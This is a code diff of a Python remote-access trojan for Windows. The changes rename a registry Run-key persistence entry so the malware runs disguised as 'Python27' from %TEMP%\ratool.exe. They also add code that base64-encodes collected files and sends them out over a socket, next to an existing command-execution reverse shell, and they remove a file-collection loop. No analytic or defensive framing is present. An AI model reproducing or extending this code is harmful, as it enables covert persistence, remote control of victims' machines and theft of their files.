@@ -22,10 +22,10 @@ def autorun(tempdir, fileName, run):
 	except WindowsError:
 		pass
 
-	if 'Adobe ReaderX' not in runkey:
+	if 'Python27' not in runkey:
 		try:
 			key = OpenKey(HKEY_LOCAL_MACHINE,run,0,KEY_ALL_ACCESS)
-			SetValueEx(key,'Adobe_ReaderX',0,REG_SZ,r"%TEMP%\mw.exe")
+			SetValueEx(key,'Python27',0,REG_SZ,r"%TEMP%\ratool.exe")
 			key.Close()
 		except WindowsError:
 			pass
@@ -41,6 +41,11 @@ def shell():
 		stdout_value = proc.stdout.read() + proc.stderr.read()
 		encoded = base64.b64encode(stdout_value)
 		s.send(encoded)
+		
+		#Read files adn send them.
+		encoded_files = base64.b64encode(librat.init_sys())
+		s.send("Sending files... Prepare to receive!")
+		s.send(encoded_files)
 		s.close()
 
 def main():
@@ -51,12 +56,5 @@ def main():
 	shell()
 
 if __name__ == "__main__":
-	home = os.environ['HOME']
-	os.path.walk(root,librat.check_file_size,None)
-	args = []
-	os.path.walk(root,librat.check_file_size,arg)
-	for size,filename in arg:
-		if(size < 10000):
-			librat.collect_files(filename)
 	main()
 
